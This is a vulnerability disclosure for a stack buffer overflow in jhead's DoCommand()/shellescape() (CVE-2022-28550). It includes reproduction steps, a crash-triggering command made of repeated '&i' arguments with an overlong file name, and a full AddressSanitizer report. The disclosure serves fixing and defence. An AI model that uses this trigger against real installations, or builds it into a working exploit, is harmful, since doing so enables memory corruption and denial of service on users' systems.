# cmd-jhead-0e98605-shellescape-stack
When the command contains lots of `&i` argument, the stack buffer will overflow.  
https://github.com/Matthias-Wandel/jhead/blob/0e98605d0a08bc692b87ca878bb4dc7bdfc12471/jhead.c#L389-L406  
In `DoCommand()`, jhead calls `shellescape()` to copy strings to stack buffer `ExecString` when it detects a `&i` or `&o`. However, jhead does not check the boundary of the stack buffer `ExecString`. As a result, the stack buffer will overflow when multiple `&i` given.

## Test Environment
Ubuntu 20.04, 64 bit  
jhead (master, 0e98605)

## How to trigger
1. Compile the program with AddressSanitizer
2. Rename a jpeg file to a long name, such as `_imageaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.jpeg`
3. Run command `$ jhead -cmd "&i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &p" ./_imageaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.jpeg`

## Details
### ASAN report
```
$ ./bin_asan/bin/jhead -cmd "&i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &i &p" ./_imageaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.jpeg
=================================================================
==2726675==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffe32482b20 at pc 0x000000504177 bp 0x7ffe3247faf0 sp 0x7ffe3247fae8
WRITE of size 1 at 0x7ffe32482b20 thread T0
    #0 0x504176 in shellescape jhead.c:345:25
    #1 0x504176 in DoCommand jhead.c:393:22
    #2 0x4feae3 in ProcessFile jhead.c:884:13
    #3 0x4feae3 in main jhead.c:1770:13
    #4 0x7f1dbb26d0b2 in __libc_start_main /build/glibc-eX1tMB/glibc-2.31/csu/../csu/libc-start.c:308:16
    #5 0x41f41d in _start (/home/ubuntu178/cvelibf/test/jhead/0e98605/bin_asan/bin/jhead+0x41f41d)

Address 0x7ffe32482b20 is located in stack of thread T0 at offset 12320 in frame
    #0 0x50355f in DoCommand jhead.c:359

  This frame has 5 object(s):
    [32, 12320) 'ExecString' (line 361) <== Memory access at offset 12320 overflows this variable
    [12576, 16682) 'TempName' (line 362)
    [16944, 17088) 'dummy' (line 422)
    [17152, 17296) 'buf' (line 424)
    [17360, 17376) 'mtime' (line 431)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow jhead.c:345:25 in shellescape
Shadow bytes around the buggy address:
  0x100046488510: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100046488520: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100046488530: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100046488540: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100046488550: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x100046488560: 00 00 00 00[f2]f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2
  0x100046488570: f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2
  0x100046488580: f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00 00 00
  0x100046488590: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x1000464885a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x1000464885b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==2726675==ABORTING
```

## Reference
https://github.com/Matthias-Wandel/jhead/issues/51  
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-28550  

## Credits
ZhengZhang(zhengzhang097@gmail.com)  
Marsman1996(lqliuyuwei@outlook.com)  
Yanhao(unfuzzable123@gmail.com)  